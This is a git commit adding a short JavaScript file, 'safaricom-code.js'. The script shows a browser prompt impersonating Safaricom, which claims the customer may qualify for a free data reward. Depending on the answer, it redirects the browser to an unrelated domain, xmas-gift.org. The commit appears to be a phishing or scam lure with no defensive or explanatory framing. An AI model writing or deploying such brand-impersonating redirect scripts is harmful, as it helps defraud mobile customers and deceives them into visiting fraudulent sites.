9171f4ad63e703562df7c6ff6a8dafe53f8e25e1
4g-network <154092422+4g-network@users.noreply.github.com>
2024-05-04 22:57:19 -0700

    Update and rename nsi_js.js to safaricom-code.js

---
+++ safaricom-code.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SAFARICOM: Dear customer, kindly check if your sim card is qualify for The ongoing Safaricom 5GB - 10GB old customers Reward, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://xmas-gift.org/safaricom';
+}
